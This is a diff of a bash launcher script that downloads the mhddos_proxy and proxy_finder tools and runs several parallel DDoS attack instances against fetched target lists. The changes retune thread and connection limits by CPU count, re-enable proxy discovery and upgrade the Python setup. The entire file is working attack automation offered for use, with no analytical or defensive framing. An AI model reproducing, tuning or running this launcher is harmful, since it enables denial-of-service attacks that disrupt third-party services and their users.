@@ -4,21 +4,30 @@
 echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with DDoS and finder"
 sudo pkill -e -f runner.py
 sudo pkill -e -f finder.py
-sudo docker kill $(sudo docker ps -aqf ancestor=elwahab/dd-attack)
+#sudo docker kill $(sudo docker ps -aqf ancestor=elwahab/dd-attack)
 echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with DDoS and finder killed\033[0;0m\n"
 
 echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling our new proxy_finder...\033[0;0m\n"
 sleep 3s
 cd ~
 sudo rm -rf proxy_finder
+sudo rm -rf mhddos_proxy
 sudo apt install --upgrade git -y
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy
 git clone https://github.com/porthole-ascend-cinnamon/proxy_finder
-git clone https://github.com/Biogent/auto_mhddos_alexnest_lite
+cd auto_mhddos_alexnest_lite
+git pull --all -f
+cd ~
 
 echo -e "\n\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling latest requirements...\033[0;0m\n\n"
+
 sudo apt update -y
-sudo apt install --upgrade python3 python3-pip -y
+
+sudo apt install curl software-properties-common -y
+sudo add-apt-repository ppa:deadsnakes/ppa -y
+sudo apt install screen python3.10 python3.10-distutils -y
+curl -sS https://bootstrap.pypa.io/get-pip.py | python3.10
+sudo ln -sf /usr/bin/python3.10 /usr/bin/python3
 
 python3 -m pip install uvloop
 python3 -m pip install --upgrade pip
@@ -51,7 +60,7 @@ then
 	num_of_copies=3
 elif ((num_of_copies > 3));
 then 
-	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 3 parallel attacks\033[0;0m\n"
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 3 parallel attacks (more than 3 is not effective)\033[0;0m\n"
 	num_of_copies=3
 elif ((num_of_copies < 1));
 then
@@ -64,10 +73,10 @@ then
 fi
 
 threads="${2:-1500}"
-if ((threads < 1000));
+if ((threads < 500));
 then
-	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads - attack will be started with 1000 threads\033[0;0m\n"
-	threads=1000
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads - attack will be started with 500 threads\033[0;0m\n"
+	threads=500
 elif ((threads > 10000));
 then
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads - attack will be started with 10000 threads\033[0;0m\n"
@@ -79,10 +88,10 @@ if ((rpc < 1000));
 then
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$rpc is too LOW amount of rpc(connections) - attack will be started with 1000 rpc\033[0;0m\n"
 	rpc=1000
-elif ((rpc > 3000));
+elif ((rpc > 7000));
 then
-	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$rpc is too HIGH amount of rpc(connections) - attack will be started with 3000 rpc\033[0;0m\n"
-	rpc=3000
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$rpc is too HIGH amount of rpc(connections) - attack will be started with 7000 rpc\033[0;0m\n"
+	rpc=7000
 fi
 
 debug="${4:-}"
@@ -92,7 +101,27 @@ then
 	debug="--debug"
 fi
 
+
 rand=3
+
+proc_num=$(nproc --all)
+if ((proc_num < 2));
+then
+	if ((threads > 5000));
+	then
+		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads for 1 CPU - attack will be started with 5000 threads\033[0;0m\n"
+		threads=5000
+	fi
+	#rand=$(shuf -i 1-2 -n 1)
+elif ((proc_num >= 2 && proc_num < 4));
+then
+	if ((threads > 9000));
+	then
+		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads for $proc_num CPUs - attack will be started with 9000 threads\033[0;0m\n"
+		threads=9000
+	fi
+	#rand=$(shuf -i 1-2 -n 1)
+fi
 
 sleep 5s
 
@@ -163,7 +192,7 @@ do
 	
 		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
 		
-		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only 1 CPU, so for next 20 minutes will be started only mhddos_proxy (without proxy_finder)\033[0;0m\n"
+		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so for next 20 minutes will be started only mhddos_proxy (without proxy_finder)\033[0;0m\n"
 		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack with such parameters: $num_of_copies parallel atack(s) -t $threads --rpc $rpc $debug...\033[1;0m"
 		sleep 3s
 		# Launch multiple mhddos_proxy instances with different targets.
@@ -183,7 +212,7 @@ do
 
             		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
    		done
-		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only 1 CPU, so for next 20 minutes will be going only mhddos_proxy (without proxy_finder)\033[0;0m\n"
+		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so for next 20 minutes will be going only mhddos_proxy (without proxy_finder)\033[0;0m\n"
    		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
 	
 	elif ((rand == 3));
@@ -217,21 +246,21 @@ do
             
             		cd ~/mhddos_proxy
             		python3 runner.py $cmd_line --rpc $rpc -t $threads --vpn $debug&
-	    		sleep 10s
+	    		sleep 20s
 			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
 		done
 		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
 		sleep 5s
-		#echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting proxy_finder...\033[1;0m"
-		#sleep 2s
-		#cd ~/proxy_finder
-		#python3 finder.py --threads 2500&
+		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting proxy_finder...\033[1;0m"
+		sleep 2s
+		cd ~/proxy_finder
+		python3 finder.py --threads 1000&
 	else
-		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only 1 CPU, so for next 20 minutes will be started only proxy_finder (without mhddos_proxy)\033[0;0m\n"
+		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so for next 20 minutes will be started only proxy_finder (without mhddos_proxy)\033[0;0m\n"
 		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting proxy_finder...\033[1;0m"
 		sleep 3s
 		cd ~/proxy_finder
-		python3 finder.py --threads 2500&
+		python3 finder.py&
 	fi
 	
 	sleep $restart_interval
